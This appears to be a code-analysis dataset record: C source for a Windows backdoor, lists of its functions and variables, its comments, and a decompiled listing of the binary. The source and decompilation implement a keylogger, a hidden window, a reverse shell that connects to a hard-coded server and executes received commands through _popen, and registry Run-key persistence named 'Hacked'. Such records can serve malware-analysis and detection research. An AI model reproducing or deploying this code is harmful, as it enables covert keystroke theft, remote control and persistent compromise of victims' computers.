isCAPSLOCK=(GetKeyState(0x14)&0xFF)>0?1:0;
isNUMLOCK= (GetKeyState(0x90)&0xFF)>0?1:0;
isL_SHIFT= (GetKeyState(0xA0)&0xFF00)>0?1:0;
isR_SHIFT= (GetKeyState(0xA1)&0xFF00)>0?1:0;
//checking state of all virtual keys
for(vkey=0; vkey<0xFF; vkey++)
{
isPressed= (GetKeyState(vkey)&0xFF00)>0?1:0;
showKey= (char)vkey;
if(isPressed==1 && last_key_state[vkey]==0)
{
//for alphabets
if(vkey>=0x41 && vkey<=0x5A)
{
if(isCAPSLOCK==0)
{
if(isL_SHIFT==0 && isR_SHIFT==0)
{
showKey= (char)(vkey+0x20);
}
}
else if(isL_SHIFT==1 || isR_SHIFT==1)
{
showKey= (char)(vkey+0x20);
}
}
//for num characters
else if(vkey>=0x30 && vkey<=0x39)
{
if(isL_SHIFT==1 || isR_SHIFT==1)
{
showKey= NUMCHAR[vkey-0x30];
}
}
//for right side numpad
else if(vkey>=0x60 && vkey<=0x69 && isNUMLOCK==1)
{
showKey= (char)(vkey-0x30);
}
//for printable characters
else if(vkey>=0xBA && vkey<=0xC0)
{
if(isL_SHIFT==1 || isR_SHIFT==1)
{
showKey= chars_vs[vkey-0xBA];
}
else
{
showKey= chars_vn[vkey-0xBA];
}
}
else if(vkey>=0xDB && vkey<=0xDF)
{
if(isL_SHIFT==1 || isR_SHIFT==1)
{
showKey=chars_vb[vkey-0xDB];
}
else
{
showKey= chars_va[vkey-0xDB];
}
}
//for right side chars ./+..
//for chars like space, \n, enter etc..
//for enter use newline char
// dont print other keys
else if(vkey==0x0D)
{
showKey=(char)0x0A;
}
else if (vkey>=0x6A && vkey<=0x6F)
{
showKey= (char)(vkey-0x40);
}
else if(vkey!=0x20 && vkey!=0x09)
{
showKey=(char)0x00;
}
//print and save captured key
if(showKey!=(char)0x00)
{
kh= fopen(KEY_LOG_FILE, ""a"");
putc(showKey,kh);
fclose(kh);
}
}
//save last state of key
last_key_state[vkey]=isPressed;
}
}
}
//shell function
// taking command from our server to client server (execution of commands) function
void Shell()
{
char buffer[1024]; //for recieving commands from the server
char container[1024];
char total_response[18384];
while(1)
{
jump:
bzero(buffer, 1024); // converting the variable to 0s
bzero(container,sizeof(container)); //size of acts same as defining the size in buffer(1024)
bzero(total_response, sizeof(total_response));
//make the program recive the commands from our server
//buffer will store recieved bytes from sock, 1024 is the size of the variable
recv(sock, buffer, 1024, 0);
//our custom command lines
if(strncmp(""q"", buffer, 1) == 0)
{
closesocket(sock); //close socket
WSACleanup();
exit(0);
}
//allowing changing directories
else if(strncmp(""cd "", buffer, 3) == 0)
{
_chdir(str_cut(buffer, 3, 100));
}
//allowing persistance to the program, to auto start when pc is turned on
else if(strncmp(""persist"", buffer, 7) == 0)
{
bootRun();
}
//activating keylogger
else if(strncmp(""keylog_start"", buffer, 12)== 0)
{
//creating thread that will run keylog separately
HANDLE thread = CreateThread(NULL, 0, logg, NULL, 0, NULL);
goto jump;
}
else
{
FILE *fp; //creating file descriptors
fp= _popen(buffer,""r"");//opening a file as a process. whatever is stored in this command will be run as a certain process or a task that the system should execute,
//buffer is where it will read the command, r stands for read, we are telling the program to read the command and execute it
//fp line above, execute the command inside the buffer and stores it in fp , once we store the response inside the fp file descriptor
//we need to read from it and store the actual information inside the container bellow which is size of 1024 bytes that is why we use while loop and then fgets()
//we are getting 1024 bytes from the file descriptor inside the container variable
while(fgets(container, 1024, fp) != NULL) //fgets function gets string from another variable into a diffrent variable
{
strcat(total_response, container);
}
send(sock, total_response, sizeof(total_response), 0); //sending all the response
fclose(fp);//closing the file descriptor
}
}
}
//--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)
{
//hides terminal window
HWND stealth;
AllocConsole();
stealth = FindWindowA(""ConsoleWindowClass"", NULL);
ShowWindow(stealth, 0);
//creating socket object that we will use to perform the connection to our server
//defining two variables because we will need an ip adress and port to which we are going to connect to our backdoor
struct sockaddr_in ServAddr;
unsigned short ServPort;
char *ServIP; //will point a server IP
WSADATA wsaData; //wsdata is structure that contains information about windows sockets. we need it to have a socket connection to windows machine
ServIP= ""192.168.100.1"" ; //here we type the ip of the machine that is going to listen for the incoming connection from our backdoor
ServPort = 50005; //port that is not used by any other application
//checking for errors, if the function returns an interger that is not 0 we exit the program
if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0)
{
exit(1);
}
//defining socket object
sock= socket(AF_INET, SOCK_STREAM, 0); //AF_INET represents that we are establishing a connection over ipv4, SOCK_STREAM defines that we are going to use tcp connection/three way hanshake
//defining all diffrent parameters for serAddr because it is a part of a structure stock adress
memset(&ServAddr, 0, sizeof(ServAddr)); //clearing the variable with 0s>>set 0s to all content of servAddr(clearing it out of any bytes)
ServAddr.sin_family= AF_INET;//ipv4 coonection
ServAddr.sin_addr.s_addr = inet_addr(ServIP); // inet_addr converts string ip adress to an ip adress format
ServAddr.sin_port= htons(ServPort); // htons convert int port to port format
//performing connection to our server every 10 seconds to prevent the payload diying before a connection to our server
start:
while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0)//check the vid for error here
{
Sleep(10);
goto start;
}
Shell();
}","{
""functions"": [
""str_cut"",
""bootRun"",
""logg"",
""Shell"",
""WinMain""
]
}","{
""variables"": [
""sock"",
""str_cut"",
""buffer"",
""container"",
""total_response"",
""err"",
""suc"",
""szPath"",
""pathLen"",
""NewVal"",
""pathLenInBytes"",
""vkey"",
""last_key_state"",
""isCAPSLOCK"",
""isNUMLOCK"",
""isL_SHIFT"",
""isR_SHIFT"",
""isPressed"",
""showKey"",
""NUMCHAR"",
""chars_vn"",
""chars_vs"",
""chars_va"",
""chars_vb"",
""kh"",
""KEY_LOG_FILE"",
""fp"",
""hInstance"",
""hPrev"",
""lpCmdLine"",
""nCmdShow"",
""stealth"",
""ServAddr"",
""ServPort"",
""ServIP"",
""wsaData""
]
}","//#include <unistd.h>
//clowning memset function to bzero
//changing directory function
//persistance function
//store path and get path to our own malware
//retrives fully qualified path for the file that contains th specified module (we are geting the path to our malware)
//OPENS SPECIFIED REGISTRY AND it will try to add the new value to it
//keyloger function
//: making last key state 0
//: running infinite
//: take rest for 10 ms
//shell function
// taking command from our server to client server (execution of commands) function
//for recieving commands from the server
//creating socket object that we will use to perform the connection to our server
//defining two variables because we will need an ip adress and port to which we are going to connect to our backdoor
//wsdata is structure that contains information about windows sockets. we need it to have a socket connection to windows machine
//here we type the ip of the machine that is going to listen for the incoming connection from our backdoor
//port that is not used by any other application
//checking for errors, if the function returns an interger that is not 0 we exit the program
//defining socket object
//AF_INET represents that we are establishing a connection over ipv4, SOCK_STREAM defines that we are going to use tcp connection/three way hanshake
//defining all diffrent parameters for serAddr because it is a part of a structure stock adress
//clearing the variable with 0s>>set 0s to all content of servAddr(clearing it out of any bytes)
//ipv4 coonection
// inet_addr converts string ip adress to an ip adress format
// htons convert int port to port format
//performing connection to our server every 10 seconds to prevent the payload diying before a connection to our server
//check the vid for error here
//hides terminal window","#include ""out.h""
void FUN_004011b0(void)
{
code *pcVar1;
int *piVar2;
undefined4 puVar3;
UINT uExitCode;
___dyn_tls_init_12(0,2);
_SetUnhandledExceptionFilter_4((LPTOP_LEVEL_EXCEPTION_FILTER)&LAB_00401000);
___cpu_features_init();
_fesetenv(__CRT_fenv);
__setargv();
pcVar1 = _iob_exref;
if (__CRT_fmode != 0) {
__fmode = __CRT_fmode;
__setmode((int )(_iob_exref + 0x10),__CRT_fmode);
__setmode((int )(pcVar1 + 0x30),__CRT_fmode);
__setmode((int *)(pcVar1 + 0x50),__CRT_fmode);
}
piVar2 = (int *)___p__fmode();
*piVar2 = __fmode;
__pei386_runtime_relocator();
___main();
puVar3 = (undefined4 *)___p__environ();
uExitCode = _text_startup(__argc,DAT_00408000,(char **)*puVar3);
__cexit();
// WARNING: Subroutine does not return
_ExitProcess_4(uExitCode);
}
void __mingw32_init_mainargs(void)
{
char **local_14;
_startupinfo local_10 [4];
local_10[0].newmode = 0;
___getmainargs(&__argc,(char ***)&DAT_00408000,&local_14,__CRT_glob & 1,local_10);
return;
}
void _mainCRTStartup(void)
{
_func_4879 *in_stack_ffffffcc;
__set_app_type(1);
FUN_004011b0();
__set_app_type(2);
FUN_004011b0();
// WARNING: Could not recover jumptable at 0x00401320. Too many branches
// WARNING: Treating indirect jump as call
atexit(in_stack_ffffffcc);
return;
}
int __cdecl _atexit(_func_4879 *param_1)
{
int iVar1;
// WARNING: Could not recover jumptable at 0x00401320. Too many branches
// WARNING: Treating indirect jump as call
iVar1 = atexit(param_1);
return iVar1;
}
char * __cdecl _str_cut(char *param_1,uint param_2,uint param_3)
{
int iVar1;
size_t sVar2;
char *_Dest;
size_t local_10;
if (*param_1 == '\0') {
return (char *)0x0;
}
if (((int)param_3 < 0) && ((int)param_3 < (int)param_2)) {
sVar2 = _strlen(param_1);
if (sVar2 - 1 < ((int)param_3 >> 0x1f ^ param_3) - ((int)param_3 >> 0x1f)) {
return (char *)0x0;
}
if (sVar2 < ((int)param_2 >> 0x1f ^ param_2) - ((int)param_2 >> 0x1f)) {
param_2 = -sVar2;
}
iVar1 = -param_2;
param_1 = param_1 + sVar2 + param_2;
}
else {
if (((int)param_2 < 0) || ((int)param_3 <= (int)param_2)) {
return (char *)0x0;
}
sVar2 = _strlen(param_1);
if (sVar2 - 1 < param_2) {
return (char *)0x0;
}
iVar1 = -param_2;
param_1 = param_1 + param_2;
}
local_10 = param_3 + iVar1;
_Dest = (char *)_calloc(local_10,1);
_strncpy(_Dest,param_1,local_10);
return _Dest;
}
undefined4 _bootRun(void)
{
undefined4 uVar1;
LSTATUS LVar2;
int iVar3;
undefined4 *puVar4;
undefined4 *puVar5;
HKEY local_21c;
BYTE local_218 [260];
undefined4 local_114 [22];
undefined local_bb;
undefined2 local_ba;
undefined4 auStack_b8 [9];
undefined4 local_94;
undefined4 local_90;
undefined4 local_8c [30];
DWORD local_14;
DWORD local_10;
local_94 = 0x6c696166;
local_90 = 0xa6465;
puVar4 = local_8c;
for (iVar3 = 0x1e; iVar3 != 0; iVar3 = iVar3 + -1) {
*puVar4 = 0;
puVar4 = puVar4 + 1;
}
puVar4 = (undefined4 *)
""Created Pesistence At : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n""
;
puVar5 = local_114;
for (iVar3 = 0x16; iVar3 != 0; iVar3 = iVar3 + -1) {
*puVar5 = *puVar4;
puVar4 = puVar4 + 1;
puVar5 = puVar5 + 1;
}
*(undefined *)puVar5 = *(undefined *)puVar4;
local_bb = 0;
local_ba = 0;
puVar4 = auStack_b8;
for (iVar3 = 9; iVar3 != 0; iVar3 = iVar3 + -1) {
*puVar4 = 0;
puVar4 = puVar4 + 1;
}
local_10 = 0;
local_10 = _GetModuleFileNameA_12((HMODULE)0x0,(LPSTR)local_218,0x104);
if (local_10 == 0) {
_send_16(_sock,(char *)&local_94,0x80,0);
uVar1 = 0xffffffff;
}
else {
LVar2 = _RegOpenKeyA_12((HKEY)0x80000001,""Software\\Microsoft\\Windows\\CurrentVersion\\Run"",
&local_21c);
if (LVar2 == 0) {
local_14 = local_10;
LVar2 = _RegSetValueExA_24(local_21c,""Hacked"",0,1,local_218,local_10);
if (LVar2 == 0) {
_RegCloseKey_4(local_21c);
_send_16(_sock,(char *)local_114,0x80,0);
uVar1 = 0;
}
else {
_RegCloseKey_4(local_21c);
_send_16(_sock,(char *)&local_94,0x80,0);
uVar1 = 0xffffffff;
}
}
else {
_send_16(_sock,(char *)&local_94,0x80,0);
uVar1 = 0xffffffff;
}
}
return uVar1;
}
// WARNING: Unable to track spacebase fully for stack
void _Shell(void)
{
int iVar1;
uint uVar2;
int iVar3;
char *pcVar4;
undefined1 unaff_BP;
undefined local_4fe4 [18384];
undefined local_814 [1024];
char local_414 [1024];
FILE *local_14;
HANDLE local_10;
undefined4 uStack_8;
uStack_8 = 0x401ade;
uVar2 = ___chkstk_ms(unaff_BP);
iVar1 = -uVar2;
while( true ) {
*(undefined4 *)(&stack0x00000004 + iVar1) = 0x400;
*(undefined4 *)(&stack0x00000000 + iVar1) = 0;
*(char **)(&stack0xfffffffc + iVar1) = local_414;
(undefined4 )((int)&uStack_8 + iVar1) = 0x401afe;
_memset((void **)(&stack0xfffffffc + iVar1),(int *)(&stack0x00000000 + iVar1),
*(size_t *)(&stack0x00000004 + iVar1));
*(undefined4 *)(&stack0x00000004 + iVar1) = 0x400;
*(undefined4 *)(&stack0x00000000 + iVar1) = 0;
*(undefined **)(&stack0xfffffffc + iVar1) = local_814;
(undefined4 )((int)&uStack_8 + iVar1) = 0x401b1c;
_memset((void **)(&stack0xfffffffc + iVar1),(int *)(&stack0x00000000 + iVar1),
*(size_t *)(&stack0x00000004 + iVar1));
*(undefined4 *)(&stack0x00000004 + iVar1) = 0x47d0;
*(undefined4 *)(&stack0x00000000 + iVar1) = 0;
*(undefined **)(&stack0xfffffffc + iVar1) = local_4fe4;
(undefined4 )((int)&uStack_8 + iVar1) = 0x401b3a;
_memset((void **)(&stack0xfffffffc + iVar1),(int *)(&stack0x00000000 + iVar1),
*(size_t *)(&stack0x00000004 + iVar1));
*(undefined4 *)(&stack0x00000008 + iVar1) = 0;
*(undefined4 *)(&stack0x00000004 + iVar1) = 0x400;
*(char **)(&stack0x00000000 + iVar1) = local_414;
*(undefined4 *)(&stack0xfffffffc + iVar1) = _sock;
*(undefined4 )((int)&uStack_8 + iVar1) = 0x401b63;
_recv_16((SOCKET )(&stack0xfffffffc + iVar1),(char **)(&stack0x00000000 + iVar1),
*(int )(&stack0x00000004 + iVar1),(int *)(&stack0x00000008 + iVar1));
if (local_414[0] == 'q') break;
*(undefined4 *)(&stack0x00000004 + iVar1) = 3;
*(char **)(&stack0x00000000 + iVar1) = local_414;
*(undefined **)(&stack0xfffffffc + iVar1) = &DAT_00406120;
(undefined4 )((int)&uStack_8 + iVar1) = 0x401bba;
iVar3 = _strncmp((char **)(&stack0xfffffffc + iVar1),(char **)(&stack0x00000000 + iVar1),
*(size_t *)(&stack0x00000004 + iVar1));
if (iVar3 == 0) {
*(undefined4 *)(&stack0x00000004 + iVar1) = 100;
*(undefined4 *)(&stack0x00000000 + iVar1) = 3;
*(char **)(&stack0xfffffffc + iVar1) = local_414;
(undefined4 )((int)&uStack_8 + iVar1) = 0x401bdc;
pcVar4 = _str_cut((char **)(&stack0xfffffffc + iVar1),(uint *)(&stack0x00000000 + iVar1),
*(uint *)(&stack0x00000004 + iVar1));
*(char **)(&stack0xfffffffc + iVar1) = pcVar4;
*(undefined4 )((int)&uStack_8 + iVar1) = 0x401be4;
__chdir((char **)(&stack0xfffffffc + iVar1));
}
else {
*(undefined4 *)(&stack0x00000004 + iVar1) = 7;
*(char **)(&stack0x00000000 + iVar1) = local_414;
*(char **)(&stack0xfffffffc + iVar1) = ""persist"";
(undefined4 )((int)&uStack_8 + iVar1) = 0x401c07;
iVar3 = _strncmp((char **)(&stack0xfffffffc + iVar1),(char **)(&stack0x00000000 + iVar1),
*(size_t *)(&stack0x00000004 + iVar1));
if (iVar3 == 0) {
*(undefined4 *)((int)&uStack_8 + iVar1) = 0x401c10;
_bootRun();
}
else {
*(undefined4 *)(&stack0x00000004 + iVar1) = 0xc;
*(char **)(&stack0x00000000 + iVar1) = local_414;
*(char **)(&stack0xfffffffc + iVar1) = ""keylog_start"";
(undefined4 )((int)&uStack_8 + iVar1) = 0x401c33;
iVar3 = _strncmp((char **)(&stack0xfffffffc + iVar1),(char **)(&stack0x00000000 + iVar1),
*(size_t *)(&stack0x00000004 + iVar1));
if (iVar3 == 0) {
*(undefined4 *)(&stack0x00000010 + iVar1) = 0;
*(undefined4 *)(&stack0x0000000c + iVar1) = 0;
*(undefined4 *)(&stack0x00000008 + iVar1) = 0;
*(undefined **)(&stack0x00000004 + iVar1) = &_logg_0;
*(undefined4 *)(&stack0x00000000 + iVar1) = 0;
*(undefined4 *)(&stack0xfffffffc + iVar1) = 0;
*(undefined4 )((int)&uStack_8 + iVar1) = 0x401c6b;
local_10 = _CreateThread_24((LPSECURITY_ATTRIBUTES *)(&stack0xfffffffc + iVar1),
*(SIZE_T *)(&stack0x00000000 + iVar1),
*(LPTHREAD_START_ROUTINE *)(&stack0x00000004 + iVar1),
*(LPVOID *)(&stack0x00000008 + iVar1),
*(DWORD *)(&stack0x0000000c + iVar1),
*(LPDWORD *)(&stack0x00000010 + iVar1));
}
else {
*(undefined **)(&stack0x00000000 + iVar1) = &DAT_00406139;
*(char **)(&stack0xfffffffc + iVar1) = local_414;
*(undefined4 )((int)&uStack_8 + iVar1) = 0x401c8c;
local_14 = __popen((char **)(&stack0xfffffffc + iVar1),
*(char **)(&stack0x00000000 + iVar1));
while( true ) {
*(FILE **)(&stack0x00000004 + iVar1) = local_14;
*(undefined4 *)(&stack0x00000000 + iVar1) = 0x400;
*(undefined **)(&stack0xfffffffc + iVar1) = local_814;
(undefined4 )((int)&uStack_8 + iVar1) = 0x401cc6;
pcVar4 = _fgets((char **)(&stack0xfffffffc + iVar1),(int *)(&stack0x00000000 + iVar1),
*(FILE **)(&stack0x00000004 + iVar1));
if (pcVar4 == (char *)0x0) break;
*(undefined **)(&stack0x00000000 + iVar1) = local_814;
*(undefined **)(&stack0xfffffffc + iVar1) = local_4fe4;
(undefined4 )((int)&uStack_8 + iVar1) = 0x401ca9;
_strcat((char **)(&stack0xfffffffc + iVar1),(char **)(&stack0x00000000 + iVar1));
}
*(undefined4 *)(&stack0x00000008 + iVar1) = 0;
*(undefined4 *)(&stack0x00000004 + iVar1) = 0x47d0;
*(undefined **)(&stack0x00000000 + iVar1) = local_4fe4;
*(undefined4 *)(&stack0xfffffffc + iVar1) = _sock;
*(undefined4 )((int)&uStack_8 + iVar1) = 0x401cf3;
_send_16((SOCKET )(&stack0xfffffffc + iVar1),(char **)(&stack0x00000000 + iVar1),
*(int )(&stack0x00000004 + iVar1),(int *)(&stack0x00000008 + iVar1));
*(FILE **)(&stack0xfffffffc + iVar1) = local_14;
*(undefined4 )((int)&uStack_8 + iVar1) = 0x401d01;
_fclose((FILE **)(&stack0xfffffffc + iVar1));
}
}
}
}
*(undefined4 *)(&stack0xfffffffc + iVar1) = _sock;
*(undefined4 )((int)&uStack_8 + iVar1) = 0x401b88;
_closesocket_4((SOCKET *)(&stack0xfffffffc + iVar1));
*(undefined4 *)((int)&uStack_8 + iVar1) = 0x401b90;
_WSACleanup_0();
*(undefined4 *)(&stack0xfffffffc + iVar1) = 0;
// WARNING: Subroutine does not return
*(undefined4 )((int)&uStack_8 + iVar1) = 0x401b9c;
_exit((int *)(&stack0xfffffffc + iVar1));
}
void _WinMain_16(void)
{
int iVar1;
WSADATA local_1b8;
sockaddr local_28;
u_short local_16;
char *local_14;
HWND local_10;
_AllocConsole_0();
local_10 = _FindWindowA_8(""ConsoleWindowClass"",(LPCSTR)0x0);
_ShowWindow_8(local_10,0);
local_14 = ""192.168.100.1"";
local_16 = 0xc355;
iVar1 = _WSAStartup_8(2,&local_1b8);
if (iVar1 != 0) {
// WARNING: Subroutine does not return
_exit(1);
}
_sock = _socket_12(2,1,0);
_memset(&local_28,0,0x10);
local_28.sa_family = 2;
local_28.sa_data.2_4 = _inet_addr_4(local_14);
local_28.sa_data.0_2 = _htons_4(local_16);
while( true ) {
iVar1 = _connect_12(_sock,&local_28,0x10);
if (iVar1 == 0) break;
_Sleep_4(10);
}
_Shell();
return;
}
SOCKET _socket_12(int af,int type,int protocol)
{
SOCKET SVar1;
// WARNING: Could not recover jumptable at 0x00401e24. Too many branches
// WARNING: Treating indirect jump as call
SVar1 = socket(af,type,protocol);
return SVar1;
}
int _send_16(SOCKET s,char *buf,int len,int flags)
{
int iVar1;
// WARNING: Could not recover jumptable at 0x00401e2c. Too many branches
// WARNING: Treating indirect jump as call
iVar1 = send(s,buf,len,flags);
return iVar1;
}
int _recv_16(SOCKET s,char *buf,int len,int flags)
{
int iVar1;
// WARNING: Could not recover jumptable at 0x00401e34. Too many branches
// WARNING: Treating indirect jump as call
iVar1 = recv(s,buf,len,flags);
return iVar1;
}
ulong _inet_addr_4(char *cp)
{
ulong uVar1;
// WARNING: Could not recover jumptable at 0x00401e3c. Too many branches
// WARNING: Treating indirect jump as call
uVar1 = inet_addr(cp);
return uVar1;
}
u_short _htons_4(u_short hostshort)
{
u_short uVar1;
// WARNING: Could not recover jumptable at 0x00401e44. Too many branches
// WARNING: Treating indirect jump as call
uVar1 = htons(hostshort);
return uVar1;
}
int _connect_12(SOCKET s,sockaddr *name,int namelen)
{
int iVar1;
// WARNING: Could not recover jumptable at 0x00401e4c. Too many branches
// WARNING: Treating indirect jump as call
iVar1 = connect(s,name,namelen);
return iVar1;
}
int _closesocket_4(SOCKET s)
{
int iVar1;
// WARNING: Could not recover jumptable at 0x00401e54. Too many branches
// WARNING: Treating indirect jump as call
iVar1 = closesocket(s);
return iVar1;
}
int _WSAStartup_8(WORD wVersionRequired,LPWSADATA lpWSAData)
{
int iVar1;
// WARNING: Could not recover jumptable at 0x00401e5c. Too many branches
// WARNING: Treating indirect jump as call
iVar1 = WSAStartup(wVersionRequired,lpWSAData);
return iVar1;
}
int _WSACleanup_0(void)
{
int iVar1;
// WARNING: Could not recover jumptable at 0x00401e64. Too many branches
// WARNING: Treating indirect jump as call
iVar1 = WSACleanup();
return iVar1;
}
// WARNING: Unable to track spacebase fully for stack
int __cdecl __setargv(void)
{
char cVar1;
bool bVar2;
char *pcVar3;
uint uVar4;
char *pcVar5;
char *pcVar6;
int iVar7;
int iVar8;
char *pcVar9;
int iVar10;
char *pcVar11;
uint uStackY_60;
LPSTR pCVar12;
char acStack_4c [8];
int local_44;
undefined *local_40;
uint local_3c;
char *local_38;
int local_34;
uint local_30;
undefined local_2c [4];
undefined4 local_28;
int local_24;
undefined4 local_20;
if ((__CRT_glob & 2) == 0) {
uStackY_60 = 0x402175;
iVar8 = __mingw32_init_mainargs();
return iVar8;
}
uStackY_60 = 0x401e8b;
pcVar3 = _GetCommandLineA_0();
uStackY_60 = 0x401e98;
pCVar12 = pcVar3;
local_40 = &stack0xffffffa4;
_strlen(pcVar3);
uStackY_60 = 0x401ea7;
uVar4 = ___chkstk_ms((char)pCVar12);
iVar8 = -uVar4;
local_20 = 0;
local_30 = 0;
local_34 = 0;
local_38 = acStack_4c + iVar8;
local_3c = __CRT_glob & 0x4400 | 0x10;
uVar4 = 0;
pcVar6 = acStack_4c + iVar8;
LAB_00401ee0:
do {
cVar1 = *pcVar3;
joined_r0x00401eeb:
iVar10 = (int)cVar1;
if (iVar10 == 0) {
if (uVar4 != 0) {
pcVar5 = pcVar6 + uVar4;
pcVar3 = pcVar6;
do {
pcVar9 = pcVar3 + 1;
*pcVar3 = '\\';
pcVar6 = pcVar5;
pcVar3 = pcVar9;
} while (pcVar9 != pcVar5);
}
if ((local_38 < pcVar6) || (local_34 != 0)) {
*pcVar6 = '\0';
*(undefined4 *)(&stack0xffffffac + iVar8) = 0;
*(undefined **)(&stack0xffffffb0 + iVar8) = local_2c;
*(uint *)(&stack0xffffffa8 + iVar8) = local_3c;
*(char **)(&stack0xffffffa4 + iVar8) = local_38;
(undefined4 )((int)&uStackY_60 + iVar8) = 0x402166;
___mingw_glob((char **)(&stack0xffffffa4 + iVar8),(uint *)(&stack0xffffffa8 + iVar8),
*(undefined **)(&stack0xffffffac + iVar8),
*(char **)(&stack0xffffffb0 + iVar8));
}
__argc = local_28;
DAT_00408000 = local_24;
return local_24;
}
pcVar3 = pcVar3 + 1;
if (cVar1 == '?') goto LAB_00402083;
if (cVar1 < '@') {
iVar7 = (int)uVar4 >> 1;
if (cVar1 != '\'') {
if (cVar1 == '') goto LAB_00402083;
if (cVar1 != '\""') goto LAB_00402020;
if (iVar7 != 0) {
pcVar9 = pcVar6 + iVar7;
pcVar5 = pcVar6;
do {
pcVar11 = pcVar5 + 1;
*pcVar5 = '\\';
pcVar6 = pcVar9;
pcVar5 = pcVar11;
} while (pcVar11 != pcVar9);
}
if ((local_30 == 0x27) || ((uVar4 & 1) != 0)) break;
local_30 = local_30 ^ 0x22;
cVar1 = *pcVar3;
uVar4 = 0;
local_34 = 1;
goto joined_r0x00401eeb;
}
if ((__CRT_glob & 0x10) == 0) {
LAB_00402020:
pcVar5 = pcVar6 + uVar4;
pcVar9 = pcVar6;
if (uVar4 != 0) {
do {
pcVar11 = pcVar6 + 1;
pcVar6 = '\\';
pcVar6 = pcVar11;
pcVar9 = pcVar5;
} while (pcVar11 != pcVar5);
}
if (local_30 == 0) {
if ((int )__mb_cur_max_exref == 1) {
if (((byte )((int *)pctype_exref + iVar10 * 2) & 0x40) == 0) goto LAB_0040206e;
}
else {
*(undefined4 *)(&stack0xffffffa8 + iVar8) = 0x40;
*(int *)(&stack0xffffffa4 + iVar8) = iVar10;
local_44 = iVar10;
*(undefined4 )((int)&uStackY_60 + iVar8) = 0x402063;
iVar7 = __isctype((int )(&stack0xffffffa4 + iVar8),(int *)(&stack0xffffffa8 + iVar8))
;
iVar10 = local_44;
if (iVar7 == 0) {
LAB_0040206e:
if (iVar10 != 9) goto LAB_00402077;
}
}
if ((local_38 < pcVar9) || (local_34 != 0)) {
*pcVar9 = '\0';
*(undefined4 *)(&stack0xffffffac + iVar8) = 0;
*(undefined **)(&stack0xffffffb0 + iVar8) = local_2c;
uVar4 = local_3c;
*(uint *)(&stack0xffffffa8 + iVar8) = local_3c;
pcVar6 = local_38;
*(char **)(&stack0xffffffa4 + iVar8) = local_38;
(undefined4 )((int)&uStackY_60 + iVar8) = 0x4021c4;
___mingw_glob((char **)(&stack0xffffffa4 + iVar8),(uint *)(&stack0xffffffa8 + iVar8),
*(undefined **)(&stack0xffffffac + iVar8),
*(char ***)(&stack0xffffffb0 + iVar8));
local_34 = 0;
local_3c = uVar4 | 1;
uVar4 = 0;
}
else {
uVar4 = 0;
local_34 = 0;
pcVar6 = pcVar9;
}
}
else {
LAB_00402077:
*pcVar9 = cVar1;
uVar4 = 0;
pcVar6 = pcVar9 + 1;
}
}
else {
if (iVar7 != 0) {
pcVar9 = pcVar6 + iVar7;
pcVar5 = pcVar6;
do {
pcVar11 = pcVar5 + 1;
*pcVar5 = '\\';
pcVar6 = pcVar9;
pcVar5 = pcVar11;
} while (pcVar11 != pcVar9);
}
if ((local_30 == 0x22) || ((uVar4 & 1) != 0)) {
*pcVar6 = '\'';
uVar4 = 0;
local_34 = 1;
pcVar6 = pcVar6 + 1;
}
else {
local_30 = local_30 ^ 0x27;
uVar4 = 0;
local_34 = 1;
}
}
goto LAB_00401ee0;
}
if (cVar1 == '\\') {
if (local_30 == 0x27) {
*pcVar6 = '\\';
pcVar6 = pcVar6 + 1;
}
else {
uVar4 = uVar4 + 1;
}
goto LAB_00401ee0;
}
if (cVar1 == '\x7f') {
LAB_00402083:
if (uVar4 == 0) {
bVar2 = iVar10 == 0x7f || local_30 != 0;
goto LAB_00401ffb;
}
bVar2 = iVar10 == 0x7f || local_30 != 0;
}
else {
if (cVar1 != '[') goto LAB_00402020;
if ((__CRT_glob & 0x20) != 0) goto LAB_00402083;
bVar2 = true;
pcVar5 = pcVar6;
if (uVar4 == 0) goto LAB_00402012;
}
pcVar5 = pcVar6 + uVar4;
pcVar9 = pcVar6;
do {
pcVar6 = pcVar9 + 1;
*pcVar9 = '\\';
pcVar9 = pcVar6;
} while (pcVar6 != pcVar5);
LAB_00401ffb:
pcVar5 = pcVar6;
if (bVar2) {
LAB_00402012:
pcVar6 = pcVar5 + 1;
*pcVar5 = '\x7f';
}
*pcVar6 = cVar1;
uVar4 = 0;
pcVar6 = pcVar6 + 1;
} while( true );
*pcVar6 = '\""';
uVar4 = 0;
local_34 = 1;
pcVar6 = pcVar6 + 1;
goto LAB_00401ee0;
}
// WARNING: Removing unreachable block (ram,0x004022f4)
// WARNING: Removing unreachable block (ram,0x004022e6)
// WARNING: Removing unreachable block (ram,0x0040223e)
// WARNING: Removing unreachable block (ram,0x0040222f)
// WARNING: Removing unreachable block (ram,0x004022be)
// WARNING: Removing unreachable block (ram,0x004022c6)
// WARNING: Removing unreachable block (ram,0x004022c9)
// WARNING: Removing unreachable block (ram,0x004022d1)
// WARNING: Removing unreachable block (ram,0x004022d4)
// WARNING: Removing unreachable block (ram,0x004022d9)
// WARNING: Globals starting with '' overlap smaller symbols at the same address
void ___cpu_features_init(void)
{
int *piVar1;
int iVar2;
uint *puVar3;
uint uVar4;
byte in_VIP;
byte in_ID;
undefined auStack_210 [520];
uVar4 = (uint)(in_ID & 1) * 0x200000 | (uint)(in_VIP & 1) * 0x100000;
if (((((uint)(((uVar4 ^ 0x200000) & 0x200000) != 0) * 0x200000 ^ uVar4) & 0x200000) != 0) &&
(piVar1 = (int *)cpuid_basic_info(0), *piVar1 != 0)) {
iVar2 = cpuid_Version_info(1);
uVar4 = *(uint )(iVar2 + 8);
____cpu_features = (uint)((uVar4 & 0x100) != 0);
if (((uint *)(iVar2 + 0xc) & 0x2000) != 0) {
____cpu_features = ____cpu_features | 0x80;
}
if ((uVar4 & 0x8000) != 0) {
____cpu_features = ____cpu_features | 2;
}
if ((uVar4 & 0x800000) != 0) {
____cpu_features = ____cpu_features | 4;
}
if ((uVar4 & 0x1000000) != 0) {
____cpu_features = ____cpu_features | 8;
_fxsave(auStack_210);
_fxrstor(auStack_210);
_fxsave(auStack_210);
LOCK();
UNLOCK();
_fxrstor(auStack_210);
}
puVar3 = (uint *)cpuid(0x80000000);
if (0x80000000 < puVar3) {
iVar2 = cpuid(0x80000001);
uVar4 = 0;
